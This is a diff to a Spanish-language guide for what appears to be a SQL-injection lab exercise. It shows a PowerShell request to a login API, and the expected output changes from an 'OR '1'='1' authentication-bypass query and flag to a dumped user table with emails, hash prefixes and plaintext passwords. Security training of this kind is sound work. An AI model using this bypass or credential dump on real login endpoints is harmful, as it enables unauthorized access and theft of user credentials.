@@ -37,17 +37,22 @@ $body = @{
 
 $response = Invoke-RestMethod -Uri "https://TU-DOMINIO.vercel.app/api/login" -Method Post -ContentType "application/json" -Body $body
 
-# Mostrar el resultado obtenido
+# Mostrar el resultado obtenido y el usuario autenticado
 $response | Format-List
 $response.user | Format-List
+
+# Ver la tabla completa de usuarios extraída de la base de datos
+$response.database.records | Format-Table id, username, role, email, password_hash -AutoSize
 ```
 
 ### Respuesta esperada en PowerShell:
 ```powershell
-success       : True
-message       : Inicio de sesión correcto (Acceso Administrativo)
-user          : @{id=1; username=admin; role=SuperAdministrator; token=nexus_admin_sess_9941a8e2; internal_flag=FLAG-SQLI{nexus_sql_injection_bypass_success}}
-debug_query   : SELECT * FROM accounts WHERE username = 'admin' OR '1'='1' AND password_hash = 'cualquiercosa' LIMIT 1;
+id username      role               email                    password_hash
+-- --------      ----               -----                    -------------
+ 1 admin         SuperAdministrator admin@nexuscloud.corp    $2y$12$e8Y5... (dragon2024)
+ 2 soporte       SupportTech        soporte@nexuscloud.corp   $2y$12$k9L2... (password123)
+ 3 operador      Operator           operador@nexuscloud.corp  $2y$12$m4N1... (operador2024)
+ 4 ciso_auditor  Auditor            security@nexuscloud.corp  $2y$12$p7X9... (NexusSec#99)
 ```
 
 ---
